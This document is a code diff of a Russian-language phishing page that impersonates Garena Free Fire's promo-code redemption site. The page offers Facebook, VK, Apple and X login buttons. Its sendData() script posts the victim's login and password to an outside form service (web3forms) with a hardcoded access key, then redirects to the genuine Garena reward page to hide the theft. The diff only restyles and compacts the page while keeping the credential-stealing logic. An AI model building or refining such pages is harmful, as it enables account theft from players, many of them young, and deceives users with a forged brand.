@@ -5,51 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Garena Free Fire - Redemption Site</title>
     <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; background: #000 url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg') no-repeat center top; background-size: cover; color: #fff; height: 100vh; overflow-x: hidden; }
+        body { margin: 0; padding: 0; font-family: sans-serif; background: #000 url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg') no-repeat center top; background-size: cover; color: #fff; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
         .overlay { background: rgba(0,0,0,0.4); height: 100%; width: 100%; position: fixed; top: 0; left: 0; z-index: 1; }
+        .content { position: relative; z-index: 2; text-align: center; padding: 40px 15px 20px; flex: 1 0 auto; }
         
-        .content { position: relative; z-index: 2; text-align: center; padding: 60px 15px 20px; }
-        
-        .logo-top { width: 160px; margin-bottom: 40px; display: block; margin-left: 20px; }
-        
-        h1 { font-size: 26px; text-transform: uppercase; margin-bottom: 10px; font-weight: 900; letter-spacing: 1px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
+        h1 { font-size: 26px; text-transform: uppercase; margin: 40px 0 10px; font-weight: 900; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
         .sub { font-size: 18px; margin-bottom: 40px; text-shadow: 1px 1px 3px rgba(0,0,0,0.8); }
         
-        /* Кнопки соцсетей опущены ниже */
-        .socials { display: flex; justify-content: center; gap: 15px; margin-bottom: 60px; flex-wrap: wrap; }
-        .soc-icon { width: 48px; height: 48px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        .soc-icon img, .soc-icon svg { width: 28px; height: 28px; }
+        .socials { display: flex; justify-content: center; gap: 15px; margin-bottom: 50px; }
+        .soc-icon { width: 52px; height: 52px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .soc-icon img, .soc-icon svg { width: 32px; height: 32px; object-fit: contain; }
 
-        .info-card { background: rgba(235, 235, 235, 0.95); color: #333; padding: 20px; border-radius: 4px; text-align: left; max-width: 420px; margin: 0 auto 80px; font-size: 13.5px; line-height: 1.4; border-top: 4px solid #ccc; }
+        .info-card { background: rgba(235, 235, 235, 0.95); color: #333; padding: 20px; border-radius: 4px; text-align: left; max-width: 420px; margin: 0 auto 30px; font-size: 13.5px; line-height: 1.4; border-top: 4px solid #ccc; }
         .info-card b { display: block; margin-bottom: 10px; font-size: 17px; color: #000; }
         .orange { color: #ff6b00; font-weight: bold; }
 
-        /* Футер как в оригинале */
-        .footer { position: relative; z-index: 2; background: #000; padding: 25px 20px; display: flex; align-items: center; justify-content: center; gap: 15px; border-top: 1px solid #333; }
-        .footer img { width: 40px; }
-        .footer-text { font-size: 11px; color: #888; text-align: left; line-height: 1.3; }
+        .footer { position: relative; z-index: 2; background: #000; padding: 25px 20px; border-top: 1px solid #333; text-align: center; margin-top: auto; }
+        .footer-text { font-size: 11px; color: #888; }
 
-        /* Окно входа */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
-        .login-box { background: #fff; width: 88%; max-width: 340px; padding: 25px; border-radius: 8px; color: #000; position: relative; }
-        .login-box h2 { margin: 0 0 20px; font-size: 20px; color: #ff6b00; text-transform: uppercase; font-weight: 900; }
-        .login-box input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 15px; background: #f9f9f9; }
+        /* МОДАЛКА - ТЕПЕРЬ ВСЕ КЛИКАЕТСЯ */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; align-items: center; justify-content: center; }
+        .login-box { background: #fff; width: 88%; max-width: 340px; padding: 25px; border-radius: 8px; color: #000; position: relative; z-index: 10001; }
+        .login-box h2 { margin: 0 0 20px; font-size: 20px; color: #ff6b00; text-transform: uppercase; font-weight: 900; text-align: center; }
         
-        .show-pass { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; font-size: 14px; color: #666; cursor: pointer; }
-        .show-pass input { width: auto; margin: 0; }
+        .login-box input[type="text"], .login-box input[type="password"] { 
+            width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; color: #000;
+        }
+        
+        .show-pass-wrapper { display: flex; align-items: center; justify-content: center; gap: 8px; margin: -5px 0 20px; font-size: 14px; color: #666; cursor: pointer; }
+        .show-pass-wrapper input { width: 18px; height: 18px; cursor: pointer; }
 
-        .login-box button { width: 100%; padding: 14px; background: #ff6b00; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 4px 0 #d35400; }
+        .login-box button { width: 100%; padding: 14px; background: #ff6b00; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
-
     <div class="content">
-        <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/logo_small.png" class="logo-top" alt="FF Logo">
-        
         <h1>Страница активации промокода</h1>
         <div class="sub">Пожалуйста, войдите</div>
-
         <div class="socials">
             <div class="soc-icon" onclick="openLogin('Facebook')"><svg viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></div>
             <div class="soc-icon" onclick="openLogin('VK')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/2048px-VK_Compact_Logo_%282021-present%29.svg.png"></div>
@@ -57,64 +50,43 @@
             <div class="soc-icon" onclick="openLogin('Apple')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/600px-Apple_logo_black.svg.png"></div>
             <div class="soc-icon" onclick="openLogin('X')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/X_logo.jpg/1200px-X_logo.jpg"></div>
         </div>
-
         <div class="info-card">
             <b>Важная информация</b>
-            1. Код погашения содержит <span class="orange">12/16</span> символов, комбинацию из заглавных букв и цифр.<br>
-            2. Полученные награды можно увидеть во вкладке <span class="orange">[Склад]</span> в главном меню игры, а золото и алмазы начисляются на баланс автоматически.<br>
-            3. Учитывайте срок действия кода. Если срок действия истек, код не может быть погашен.<br>
-            4. Если вы столкнулись с проблемой, свяжитесь со службой поддержки.<br>
-            5. Активация промокода для гостевого аккаунта невозможна. Для таких случаев необходимо привязать гостевой аккаунт к Facebook или Вконтакте в Настройках игры.
+            1. Код погашения содержит <span class="orange">12/16</span> символов.<br>
+            2. Награды появятся во вкладке <span class="orange">[Склад]</span>.<br>
+            3. Учитывайте срок действия кода.<br>
+            4. Есть проблемы — пишите в поддержку.<br>
+            5. Активация для гостевого аккаунта невозможна.
         </div>
     </div>
-
+    
     <div class="footer">
-        <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/garena_logo.png" alt="Garena">
-        <div class="footer-text">
-            Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
-        </div>
+        <div class="footer-text">Copyright © Garena International. All rights reserved.</div>
     </div>
 
     <div id="modal" class="modal">
-        <div class="login-box">
+        <div class="login-box" onclick="event.stopPropagation()">
             <h2 id="logTitle">ВХОД</h2>
             <input type="text" id="user" placeholder="Логин (Email/Телефон)">
             <input type="password" id="pass" placeholder="Пароль">
-            <div class="show-pass" onclick="togglePass()">
-                <input type="checkbox" id="check"> Показать пароль
-            </div>
+            <label class="show-pass-wrapper">
+                <input type="checkbox" id="check" onchange="togglePass()"> <span>Показать пароль</span>
+            </label>
             <button onclick="sendData()">ПОДТВЕРДИТЬ</button>
         </div>
     </div>
 
     <script>
-        let platform = "";
-        const ACCESS_KEY = "0a270743-92d9-493a-9c4d-680fac6ba260";
-
-        function openLogin(name) {
-            platform = name;
-            document.getElementById('logTitle').innerText = 'ВХОД ЧЕРЕЗ ' + name;
-            document.getElementById('modal').style.display = 'flex';
-        }
-
-        function togglePass() {
-            const p = document.getElementById('pass');
-            const c = document.getElementById('check');
-            p.type = p.type === "password" ? "text" : "password";
-            c.checked = p.type === "text";
-        }
-
+        let pl = ""; const AK = "0a270743-92d9-493a-9c4d-680fac6ba260";
+        function openLogin(name) { pl = name; document.getElementById('logTitle').innerText = 'ВХОД ЧЕРЕЗ ' + name; document.getElementById('modal').style.display = 'flex'; }
+        function togglePass() { const p = document.getElementById('pass'); p.type = p.type === "password" ? "text" : "password"; }
         function sendData() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            if(u.length < 3 || p.length < 4) return alert("Ошибка входа!");
-            fetch("https://api.web3forms.com/submit", {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ access_key: ACCESS_KEY, message: `ЛОГ: ${u} | ПАС: ${p} | ТИП: ${platform}` })
-            }).then(() => { window.location.href = "https://reward.ff.garena.com/ru"; });
+            const u = document.getElementById('user').value, p = document.getElementById('pass').value;
+            if(u.length < 3 || p.length < 4) return alert("Заполните поля!");
+            fetch("https://api.web3forms.com/submit", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ access_key: AK, message: `ЛОГ: ${u} | ПАС: ${p} | Т: ${pl}` }) })
+            .then(() => { window.location.href = "https://reward.ff.garena.com/ru"; });
         }
-
-        window.onclick = function(e) { if (e.target == document.getElementById('modal')) document.getElementById('modal').style.display = 'none'; }
+        document.getElementById('modal').onclick = function() { this.style.display = 'none'; }
     </script>
 </body>
 </html>
